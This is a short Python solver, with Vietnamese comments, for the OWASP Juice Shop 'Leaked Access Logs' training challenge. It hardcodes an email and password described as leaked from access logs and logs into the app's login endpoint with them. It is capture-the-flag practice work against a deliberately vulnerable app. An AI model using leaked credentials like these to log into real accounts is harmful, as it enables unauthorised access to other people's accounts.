from core.base_solver import BaseSolver
from loguru import logger

class LeakedAccessLogsSolver(BaseSolver):
    """
    Challenge: Leaked Access Logs (dlpPasswordSprayingChallenge)
    
    Thông tin rò rỉ từ Access Log (OSINT):
    - Email: J12934@juice-sh.op
    - Password: 0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB
    """
    @property
    def challenge_key(self) -> str:
        return "dlpPasswordSprayingChallenge"

    def solve(self) -> bool:
        email = "J12934@juice-sh.op"
        password = "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB"
        
        login_payload = {"email": email, "password": password}
        response = self.client.post("/rest/user/login", json=login_payload)
        
        if response.ok:
            logger.info("Logged in with leaked credentials: J12934")
            return True
        else:
            logger.error(f"Login failed: {response.status_code}")
            return False
